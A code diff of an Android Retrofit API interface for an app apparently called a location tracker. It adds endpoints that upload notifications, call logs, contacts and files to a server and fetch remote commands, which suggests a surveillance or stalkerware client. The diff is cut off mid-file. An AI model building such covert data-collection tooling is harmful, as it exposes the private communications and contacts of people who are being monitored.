@@ -1,39 +1,49 @@
 package com.varbin.locationtracker.APIs;
 
-import android.os.Build;
-
 import java.util.List;
 
+import callDetails.deviceRegisterModel;
 import callDetails.inActiveCommand;
+import models.logModel;
 import models.AttrModel;
+import models.ContactModel;
 import models.FileUpload;
+import notifications.notificationModel;
 import retrofit2.Call;
 import retrofit2.http.Body;
 import retrofit2.http.Field;
 import retrofit2.http.FormUrlEncoded;
 import retrofit2.http.GET;
-import retrofit2.http.HEAD;
-import retrofit2.http.Header;
-import retrofit2.http.Headers;
 import retrofit2.http.POST;
-import retrofit2.http.Path;
-import retrofit2.http.Query;
 import retrofit2.http.Url;
-import synceAdapter.AccountConstants;
 
 public interface MyInterface {
-
+    // live notification
+    @POST("createNotification")
+    Call<notificationModel> sendNotification (@Body notificationModel nm);
+    // live location
     @POST("createLocation")
     Call<ModelClass> createLocation (@Body ModelClass modelClass);
-
+    // call log
+    @POST("crateCallLogBulk")
+    Call<logModel> sendCallLog (@Body logModel del);
+    // user register
     @POST("createContactPerson")
+    Call<deviceRegisterModel> registerDevice (@Body deviceRegisterModel dm);
+    // contact list to server
+    @POST("crateContactBulk")
     Call<ContactModel> createContact (@Body ContactModel contactModel);
-
+    //command for active
     @GET
     Call<List<AttrModel>> getCommand(@Url String url);
+    // disable active command
     @GET
     Call<inActiveCommand> inActiveCommand(@Url String url);
-
+    // file upload command
+    @FormUrlEncoded
+    @POST
+    Call<Void> uploadData (@Field("file") String encode , @Url String url);
+    // path sender
     @POST("setCommandFile")
     Call<FileUpload> sendData2 ( @Body FileUpload fileUpload);
     @FormUrlEncoded
